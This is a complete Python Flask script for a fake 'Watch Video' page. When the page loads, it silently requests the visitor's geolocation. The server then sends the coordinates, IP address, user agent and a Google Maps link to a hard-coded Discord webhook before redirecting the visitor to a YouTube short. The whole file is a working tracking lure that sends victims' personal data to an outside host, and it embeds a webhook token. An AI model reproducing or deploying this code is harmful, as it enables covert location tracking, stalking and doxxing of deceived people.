from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# Your Discord webhook
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1408082724153065524/tRuhF_l64XjrgZ2m3ogWewhKppnteSuXQyENsIzDLoNM7shkM1zjg0p4OrCQWwKmKZte"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Watch Video</title>
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch('/log_location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    }).then(() => {
                        // Wait 1.5 sec before redirect
                        setTimeout(() => {
                            window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7";
                        }, 1500);
                    });
                }, function() {
                    // If user blocks location, still redirect
                    window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7";
                });
            } else {
                window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7";
            }
        }
        window.onload = sendLocation;
    </script>
</head>
<body>
    <h2>Loading video...</h2>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")

    latitude = data.get("latitude")
    longitude = data.get("longitude")

    content = {
        "content": f"📍 New visitor:\n"
                   f"IP: {ip}\n"
                   f"User-Agent: {user_agent}\n"
                   f"Latitude: {latitude}\n"
                   f"Longitude: {longitude}\n"
                   f"Google Maps: https://www.google.com/maps?q={latitude},{longitude}"
    }

    try:
        requests.post(DISCORD_WEBHOOK, json=content)
    except Exception as e:
        print("Error sending to Discord:", e)

    return "OK", 200

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
